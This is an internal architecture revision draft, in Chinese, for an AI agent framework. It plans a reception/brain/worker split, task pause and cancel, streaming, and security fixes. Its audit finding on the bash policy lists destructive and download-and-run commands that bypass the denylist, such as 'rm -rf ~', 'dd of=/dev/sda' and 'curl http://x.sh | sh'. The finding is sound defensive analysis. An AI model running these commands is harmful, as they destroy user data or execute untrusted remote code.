# Architecture Revision

> 状态：草案 · 2026-07-12
> 目的：把"用户不用等 + agent 决定流程"从口号落到可执行架构，并对照现状列出商业化差距与迁移路线。

## 0. TL;DR

当前框架有异步派发的原语（`acceptPrompt` 立即返回 taskId），但**接待与大脑是同一个东西**、**流程被 if/else 写死**、**任务不可暂停/取消/恢复**、**全链路非流式**、**单后端无角色模型**。这五点合起来就是"不好用、远没到商业化"的根因。本文给出三角色架构（Reception / Brain / Worker）、各自工具表面、运行时不变量、默认"相关即暂停"行为，以及一份 P0/P1/P2 差距清单和分刀迁移路线。

---

## 1. 背景与问题

现有 agent（包括本仓库当前形态）的通病：每个 prompt 必须等上一个处理完才进流程，有等待队列，体验差。本项目的差异化主张应是**用户始终不被挡住、流程始终可被 agent 重塑**。但目前代码里流程躺在 TypeScript 控制流里，agent 只是个"选择题答题器"，距离商业化有明显差距。

---

## 2. 目标：7 条设计主张

1. **核心差异化：用户不用等** —— 无等待队列，prompt 随时进。
2. **专门"接待"agent** —— 快速响应、并行发请求、第一时间接住用户。
3. **专门"大脑"agent** —— 协调任务、决定流程。
4. **多任务并行 + 实时介入** —— 用户可随时注入信息或调整运行中的任务（steering）。
5. **目标体感** —— 灵活、responsive、与用户 align。
6. **流程不写死，让 agent 决定** —— 控制权从代码控制流交还 agent。
7. **相关即暂停（default）** —— 用户 prompt 与某 running 任务相关时，抢占式暂停该任务先处理用户的话；恢复便宜，偏向暂停。

---

## 3. 现状诊断：为什么"死"、为什么"不好用"

### 3.1 流程被枚举与分支写死（主张 6 的反面）

- **路由是固定枚举**：`RouteAction = 'new_task' | 'query_task' | 'update_task' | 'derived_task' | 'sync_task' | 'clarify_target'`（`src/runtime/coordinator.ts:70`）。路由 LLM 只能六选一，不能"决定流程"。
- **路由结果跑大 if/else**：`routeAndRunAcceptedTask`（`coordinator.ts:584-698`）每个标签对应一段手写分支。加新行为要改 coordinator 本身。
- **planner 也是固定分类器**：`PlanStepIntent = answer | tool_loop | code_change | verify | ask_user`（`src/runtime/planner.ts:121-123`），`fallbackPlannerDecision`（`planner.ts:36-65`）靠正则猜 intent。agent 选标签、代码跑分支。

**试金石**：能否不改 coordinator 代码、仅靠改 prompt/工具描述就让系统多出一种全新行为？现在不能（得加枚举 + 加分支）。目标是能。

### 3.2 接待与大脑未分家（主张 2/3 的反面）

`acceptPrompt`（`coordinator.ts:700-719`）同步建任务后 `setTimeout(0)` 调度 `routeAndRunAcceptedTask`，后者把**路由（一次阻塞 LLM）+ 执行**串在一条 async 链里。没有独立"接待"角色，用户看到的体验是"任务卡 + 转圈 + 沉默"，直到路由 LLM 跑完。`master_response` 事件只在 `query_task` 全部生成完才触发（`coordinator.ts:609`），恰好是"接待"该做的反面。

### 3.3 任务不可暂停/取消/恢复（主张 4/7 的反面）

- 全代码库无 `AbortController` 透传到任务层；`SubAgentTask.cancelled` 字段（`src/domain/task.ts:94`）从未被置位。
- `MasterCoordinator` 无 `cancelTask`/`pauseTask` 方法（`coordinator.ts:177-234`）。
- `update_task` 分支只 `appendTaskMailboxUpdate`（`coordinator.ts:623`），**只有目标任务处于 completed/failed/blocked 才重新入队**（`coordinator.ts:625-630`）；running 任务**不会停**，只等下一个 `absorbMailboxUpdates` 检查点。这就是主张 7 要改的"普通 agent 行为"。
- TUI 的 SIGINT 只退出进程（`src/ui/tui.ts:782-792`）；bash 工具无 abort（`src/infra/tools.ts:696-708`，仅 60s 硬超时）；Web UI 无停止按钮。

### 3.4 关键路径非流式（主张 2/5 的反面）

`callModelText`（`coordinator.ts:2006-2033`）用 `for await...of streamModelText` 累积 `full` 后才返回。router（`:392`）、planner（`:1772`）、goal-verifier（`:1601`）、presentation（`:548`）、summarizer（`:1556`）、task-name（`:511`）全走它。用户看到第一个 token 前至少要等 router+planner 两次完整 LLM 往返。phase 事件已有，但 TUI 不渲染 `task_phase`（`tui.ts:698-700` 直接 return）。

### 3.5 单后端、无角色模型（主张 2/3 的反面）

`MasterCoordinator` 只有单一 `this.backend`（`coordinator.ts:185`），被 router/planner/executor/subagent/presentation/verifier/summarizer/task-name 全部共用。`AgentConfig.models` 是扁平 alias 映射（`src/config.ts:42`），`resolveModelConfig`（`src/model-config.ts:15-54`）无角色绑定字段。`AgentRole` 类型存在（`src/domain/task.ts:7`）但从未用于选模型。**这直接违背"接待用快模型、大脑用强模型"的立论。**

### 3.6 上下文无管理、崩溃无恢复、安全可绕过

- tool-loop `messages` 数组无限增长（`coordinator.ts:1895,1832,1936,1875`），bash 4MB stdout 原样塞入，直到模型报 context error；`compressHistory`（`coordinator.ts:1549-1567`）只压缩 goal 流程，且 `contextWindow=131072` 硬编码与真实模型无关。
- `loadPersistedTasks`（`coordinator.ts:236-244`）对 `status:'running'` 任务**不重新入队**；`void this.persist(task)` 多处 fire-and-forget 有并发覆写竞态；进程崩溃 = 任务永远卡在 running。
- bash 策略默认 `moderate`（`src/cli.ts:20`）等于不设防：`authorizeToolCall`（`src/policy.ts:73-82`）只在 `strict` 才查 allowlist，`moderate` 仅 `bashDenylist` 子串匹配（`policy.ts:76`）。denylist（`policy.ts:38`）是字面子串，`rm -rf ~`、`rm -fr /`、`find / -delete`、`dd if=/dev/zero of=/dev/sda`、`curl http://x.sh | sh` 全部漏过；bash 在 `process.cwd()` 全权限执行无沙箱（`tools.ts:696-700`）。

---

## 4. 目标架构：Reception / Brain / Worker

把"一个大类里塞三套分支"重构为**三个带不同工具箱和不同模型的 agent**，coordinator 缩成一个**能力运行时 + 安全层**。

### 4.1 三角色与职责

| 角色 | 模型 | 职责 | KPI |
|------|------|------|-----|
| **Reception 接待** | 快模型（流式） | 第一时间用自然语言接住用户；并行 triage 意图喂给 Brain | 回车后 <300ms 见到第一句人话 |
| **Brain 大脑** | 强模型 | 决定流程：spawn / steer / pause / merge / query / ask_user，组合任务控制原语 | 决策质量、不 thrash |
| **Worker** | 按任务选 | 执行单任务：文件/工具循环，可被 mailbox 重规划 | 任务完成率、不破坏并发 |

Reception 与 Brain 并行触发：Reception 流式回用户，Brain 在后台决策。Brain 决策落地后若与 Reception 刚说的有出入，再发一条更正——用户已被接住，更正不显得卡。

### 4.2 工具表面（tool surface）

把现在写死在 if/else 里的能力，暴露成 agent 可调用的原语。**agent 拥有流程，运行时拥有安全。**

**Reception 工具箱（最小）：**
- `user.respond(text, stream)` —— 流式回复用户
- `context.read(taskIds?)` —— 读任务上下文快照
- `brain.delegate(intent, payload)` —— 把 triage 结果交给 Brain

**Brain 工具箱（全套任务控制原语）：**
- `task.spawn(prompt, {readOnly, derivedFrom, sharedContext})` —— 开新任务
- `task.query(taskId, question)` —— 从任务状态回答
- `task.steer(taskId, update)` —— 写 mailbox，触发重规划
- `task.pause(taskId)` —— 抢占式暂停 running 任务（default on related）
- `task.resume(taskId)` / `task.replan(taskId)` / `task.abort(taskId)`
- `task.merge(into, from)` / `task.split(taskId, ...)`
- `user.clarify(taskId, question, choices)` —— 让用户在具体选项里选
- `context.read` / `context.summary`

**Worker 工具箱：** 现有 `src/infra/tools.ts` 的文件/工具集 + `patch.submit`，受 policy 约束。

### 4.3 运行时不变量（不交给 agent，由运行时硬守）

- **文件锁**：`FileLockManager` 已有，扩展为 `acquire(path, timeoutMs)` 带超时（当前 `src/runtime/locks.ts:9-24` FIFO 无超时，长任务可能死锁）。
- **并发上限**：顶层任务需 gate（当前无，`acceptPrompt` 的 `setTimeout(0)` 会让 N 个 prompt = N 个并行 LLM 打爆 rate limit）。引入可配置 `TopLevelConcurrencyLimiter`（默认 4）。
- **mailbox 只追加、可审计**：保留。
- **patch 原子性**：当前 `submitPatch`（`coordinator.ts:979-983`）多文件顺序写、第 N 个失败不回滚——改为写 `.tmp` 再 rename，或失败回滚 snapshot。
- **安全策略**：bash 改命令名 allowlist + 沙箱（见 §5 P0-4）。

### 4.4 默认行为：相关即暂停（主张 7）

触发链：
1. 新 prompt 到达，Reception 即时流式回用户（"收到，我先把任务 X 停一下"）。
2. Brain 并行判定"相关"（相关性的判定本身就是 Brain 的活，不写死规则）。
3. 若相关 → Brain 立即发 `task.pause(targetId)`，**抢占式**（不等检查点）。
4. 处理用户 prompt：改方向 / 补信息 / 确认。
5. 处理完 → Brain 决定 `task.resume` / `task.replan` / `task.abort`。

因为恢复便宜，**偏向暂停**，宁可多停一次也不让用户等。要警惕"相关"定义过宽导致 thrash——由 Brain 兜底判断 + 运行时并发上限兜底。

---

## 5. 商业化差距清单

### P0 —— 阻塞商业化

| # | 问题 | 证据 | 修复方向 |
|---|------|------|----------|
| P0-1 | 无法取消/暂停运行中任务 | 无 AbortController 透传；`SubAgentTask.cancelled`（`domain/task.ts:94`）从未置位；无 `cancelTask`/`pauseTask`（`coordinator.ts:177-234`）；TUI SIGINT 只退出（`tui.ts:782-792`）；bash 无 abort（`tools.ts:696-708`）；Web 无停止按钮 | `MasterCoordinator.cancelTask(taskId)`，AbortController 串到 `chatStream`/`executeTool`/`execAsync`，`runTaskStream` 每 turn 检查信号；Web/TUI 加停止按钮 |
| P0-2 | 多角色模型配置不存在 | 单一 `this.backend`（`coordinator.ts:185`）全角色共用；`AgentConfig.models` 扁平 alias（`config.ts:42`）；`AgentRole`（`domain/task.ts:7`）从未用于选模型 | `.agentrc` 加 `roleModels: { reception, brain, worker, ... }`；`callModelText`/`streamModelWithTools` 接 `role` 参数选 `BackendConfig` |
| P0-3 | 崩溃后无法恢复 running 任务 | `loadPersistedTasks`（`coordinator.ts:236-244`）不重新入队 running；`TaskStore.save` 整文件覆写（`store.ts:78-82`）；`void persist` fire-and-forget 有并发覆写竞态 | 启动时扫 `status==='running'` 且 `updatedAt` 超时任务 → 置 `interrupted` + 提供 `resumeTask` 重入；persist 加版本号/append-only |
| P0-4 | bash 策略可被 trivially 绕过 | `moderate` 仅子串 denylist（`policy.ts:76`），denylist 字面子串（`policy.ts:38`）；`rm -rf ~`/`find / -delete`/`dd of=/dev/sda`/`curl x.sh \| sh` 全漏；无沙箱（`tools.ts:696-700`） | strict 默认 + 命令名 allowlist；moderate 至少拦 `rm`/`mkfs`/`dd`/管道 `sh`；引入沙箱 |
| P0-5 | tool-loop 消息无限增长直到 context error | `runToolLoopStream`/`agenticStreamRaw`（`coordinator.ts:1895,1832,1936,1875`）每轮 push；bash 4MB stdout 原样塞入；`compressHistory`（`coordinator.ts:1549-1567`）只压 goal 流程且 `contextWindow=131072` 硬编码 | 每 turn 估算 token，超阈对早期 tool_result 做 excerpt 或调 `compressHistory`；`contextWindow` 从 `BackendConfig` 真实传入 |

### P1 —— 严重

| # | 问题 | 证据 | 修复方向 |
|---|------|------|----------|
| P1-6 | 顶层任务无并发上限 | `acceptPrompt` 的 `setTimeout(0)`（`coordinator.ts:715-717`）直接跑；`runningTasks` Set 只防同 taskId 重入，不限并发 | `TopLevelConcurrencyLimiter`（默认 4），`enqueueTaskRun` 改排队启动 |
| P1-7 | 关键路径非流式，首 token 延迟差 | `callModelText`（`coordinator.ts:2006-2033`）累积后返回；router/planner/verifier/presentation/summarizer 全走它；phase 事件 TUI 不渲染（`tui.ts:698-700`） | `callModelText` 加 `onToken` 回调；router/planner 即时推 phase 事件给 UI；TUI 渲染 `task_phase` |
| P1-8 | `submitPatch` 部分写入无回滚 | `coordinator.ts:979-983` 顺序写多文件，第 N 个失败前 N-1 已落盘；`fillPatchDiffs`（`coordinator.ts:885-899`）读旧失败默认 `before=''` 可能误判 conflict | 写前 snapshot 旧内容，失败回滚；或全写 `.tmp` 再 rename |
| P1-9 | 可观测性不足以诊断 prod 卡死 | `telemetry.ts` 26 行内存环形缓冲 5000 条无持久化/导出；`backend_retry`/`error` 事件定义了（`domain/task.ts:230`）但从未 emit；`llmTrace` 默认关（`coordinator.ts:309`）；无 token/cost/延迟指标；`waitForSubagent` 250ms 轮询无日志（`coordinator.ts:831-840`） | telemetry 落盘 + `/api/telemetry/:taskId`；`fetch.ts` retry emit `backend_retry`；默认采样 LLM trace（脱敏）；加 token/cost 指标 |
| P1-10 | Web UI 多任务 steering 受限 + 渲染卡顿 | `/api/prompt` 总全局路由（`index.html:2281`），无法指定 "发给 task X"；无 cancel/pause 按钮；`appendStreamToCard`（`index.html:1704-1709`）每 token `innerHTML` 全量重渲染 O(n²)；SSE 无心跳（`web.ts:467` 仅首帧） | `/api/prompt` 加 `targetTaskId`；渲染改 `appendChild` 增量；SSE 每 15s `: ping` |

### P2 —— 体验改进

| # | 问题 | 证据 | 修复方向 |
|---|------|------|----------|
| P2-11 | 测试偏 happy path | `backend.test.ts` 47 行只测 helper；`master.test.ts:178-280` mock 一次写完整 NDJSON 非真流式；无 cancel/concurrency/mailbox-absorb/context-compress/FileLock 竞态测试；`tools.policy.test.ts` 无绕过模式测试 | 补 SubagentManager 队列、`parseRouteDecision` 异常 JSON、`compressHistory` 阈值、并发 `acceptPrompt` 压测、policy 绕过测试 |
| P2-12 | 文件锁无超时 | `FileLockManager.acquire`（`locks.ts:9-24`）FIFO 无超时；worker 卡死则后续该路径写全阻塞 | `acquire(path, timeoutMs)` 超时拒绝 |
| P2-13 | `parsePlanWithRetry` 修复失败仍抛 | `coordinator.ts:1817-1830` 二次失败抛异常，用户看不到具体哪步 JSON 炸 | catch 内 yield error 事件带 content 前 200 字符 |

---

## 6. UI 体验差距（TUI + Web）

### 6.1 TUI：结构性地无法支撑主张

关键发现：TUI 是 **readline + raw stdout**（`src/ui/tui.ts:1-7`），不是全屏 TUI 库（blessed 是依赖但未实际使用）。这种结构在固定输入栏旁边**无法渲染持久任务面板或实时流式**，导致一批本该有的功能是死代码：

- `appendStream`（`tui.ts:278`）从未被调用——`task_output` 流式 token 事件被显式丢弃（`tui.ts:702-704`）。用户看到 "routing request…" 后一片死寂，直到最终结果整段 dump。
- `renderSummaryBar`（`tui.ts:147`）和 `phaseText`（`tui.ts:82`）都是死代码——没有持久任务列表/状态栏，看任务只能手动 `/tasks`（`tui.ts:464`）静态快照。
- `task_phase`（`tui.ts:698-700`）和 `tool_call`（`tui.ts:706-708`）事件直接 return——阶段切换、工具活动全不可见。
- 并行任务输出仅按 task 图标前缀交织在同一个 stdout 流（`tui.ts:252-256`）。
- `task_done` 完成结果不 log 到屏幕（`tui.ts:736-738`），依赖单独的 `user_visible_message` 路径。
- Ctrl+C 退出整个应用（`tui.ts:782-792`），不是取消任务。
- 单个 `activeClarification`（`tui.ts:186`）多任务澄清会互相覆盖；待澄清期间自由文本除非是数字否则开新任务（`tui.ts:631-634`）。

**结论**：TUI 要达到主张 2/4/7 的体感，**不是补 wiring，而是要换成全屏 TUI**（blessed/ink），否则持久面板 + 实时流式 + 多任务澄清在当前 readline 结构里做不出来。

### 6.2 Web UI：架构更接近可用，但有性能与控制硬伤

- **O(n²) 流式渲染**：`appendStreamToCard`（`index.html:1704-1709`）每个 token `innerHTML = renderTaskOutputHtml(...)`，对全部累积文本跑 `marked.parse`（`index.html:1407`）。长输出页面冻结。修：追加文本节点 + 完成时再 markdown 渲染。
- **无法 steering**：`/api/prompt` 只解析 `{text, mode}`（`web.ts:505`），没有 `targetTaskId`，每条 prompt 全局路由——直接破坏主张 4。
- **无取消/暂停**：无 `/api/cancel` 端点，无停止按钮。
- **SSE 无心跳**：`web.ts:459-486` 只首帧 `: connected`，代理/LB 空闲会断连。
- **重连丢事件**：固定 2500ms 重试，无 `Last-Event-ID`、无退避（`index.html:2529-2533`）。
- **无会话切换**：Web 固定单个 `sessionId`（`web.ts:393`），不能列出/加载历史会话（TUI 有 `/sessions` `tui.ts:544`，Web 没有）。
- mailbox/patch/subagent 块也用 innerHTML 全重写（`index.html:2395,2422`），同一反模式。

### 6.3 UI 优先级

| 级别 | 项 |
|------|----|
| P0 | TUI 换全屏框架并接通流式/阶段/任务面板；Web 增量渲染修 O(n²)；两 UI 加 cancel + `targetTaskId` steering |
| P1 | Web SSE 心跳 + `Last-Event-ID` 重连；TUI 多任务澄清；Web 会话切换 |
| P2 | 运行中任务数徽章；TUI 长行换行；mailbox/patch 增量渲染 |

---

## 7. 迁移路线（分刀）

按"体感优先 + 风险从低到高"排序。每一刀独立可上线、可回滚。

**第一刀：接待流式响应（对应主张 2，体感最大）**
- `acceptPrompt` 返回 taskId 后，立刻发一个独立流式接待回复（新事件 `reception_response`），与 `routeAndRunAcceptedTask` 并行。
- 接待用快模型/流式，heuristic 先开口、LLM 再补全。KPI：回车后 <300ms 第一句。
- 不改路由逻辑，风险最低。

**第二刀：可暂停/取消/恢复（对应主张 4/7，解锁 steering）**
- `MasterCoordinator` 加 `pauseTask`/`cancelTask`/`resumeTask`，AbortController 串到 LLM stream 与 bash。
- 默认"相关即暂停"：Brain 判定相关后发 `task.pause`，替换现在只写 mailbox 的行为（`coordinator.ts:614-633`）。
- 启动时恢复 interrupted 任务（P0-3）。

**第三刀：多角色模型（对应主张 2/3，P0-2）**
- `.agentrc` 加 `roleModels`，`callModelText`/`streamModelWithTools` 接 `role` 参数。
- Reception 默认快模型，Brain 默认强模型。

**第四刀：Brain 工具化（对应主张 6，结构重构）**
- 把 `RouteAction` 枚举 + if/else 替换为 Brain 调用任务控制原语（§4.2）。
- coordinator 缩为能力运行时 + 不变量层（§4.3）。
- 这刀最大，放在前三刀体感与稳定性上来之后。

**第五刀：上下文管理 + 并发上限 + 安全（P0-5/P1-6/P0-4）**
- tool-loop token 预算 + 真实 contextWindow；顶层并发 gate；bash allowlist + 沙箱。

**第六刀：可观测性 + 测试 + Web steering（P1-9/P2-11/P1-10）**
- telemetry 落盘 + 指标；补异步路径测试；Web `/api/prompt` 支持 `targetTaskId` + 增量渲染 + SSE 心跳。

**第七刀：UI 体验完善（§6，体感与商业化门面）**
- **Web 上框架**（已决定）：迁移到 React/Solid，组件化多任务面板 + 增量渲染（修 O(n²)）+ steering 控件 + cancel 按钮 + 会话切换；SSE 心跳 + `Last-Event-ID` 重连；`/api/prompt` 支持 `targetTaskId`。
- **TUI 直接换全屏框架**（已决定）：迁移到 blessed/ink，做持久任务面板 + 实时流式 + 多任务澄清。不再保留 readline 版。
- 与第二刀（可暂停/取消）联动：cancel 按钮依赖第二刀的 `cancelTask`。
- 建议拆为两条独立子线并行：Web 框架迁移（门面优先）与 TUI 重写（可稍后）。

---

## 8. 开放问题

- **"相关"如何定义**：完全交给 Brain 判断，还是给一组启发式兜底？倾向 Brain 兜底 + 运行时并发上限防 thrash。
- **Reception 说错怎么办**：Brain 决策落地后若与接待刚说的冲突，更正机制的语气与频率上限。
- **Worker 并发数**：`SubagentManager` 硬编码 cap=2（`coordinator.ts:186`），商业化场景应可配，上限取决于后端 rate limit。
- **持久化模型**：`TaskStore` 整文件覆写有竞态，是否换 append-only 日志 + 快照。
- **多用户/多会话隔离**：当前 `sessionTaskIds` 是进程内 Set，商业化需考虑多租户。
- **TUI 是否换框架**（已决定：直接换）：readline/raw-stdout 做不出持久面板 + 实时流式，**直接切换到全屏 TUI 框架**（blessed/ink），不保留 readline fallback。
- **Web 渲染栈**（已决定：上框架）：**采用 Web 框架**（React/Solid），原生 HTML+JS 维护成本过高，多任务面板 + 增量渲染 + steering 控件需要组件化。

---

_本文为活文档，随实现推进更新。每一刀落地后回填实际改动与验证结果。_
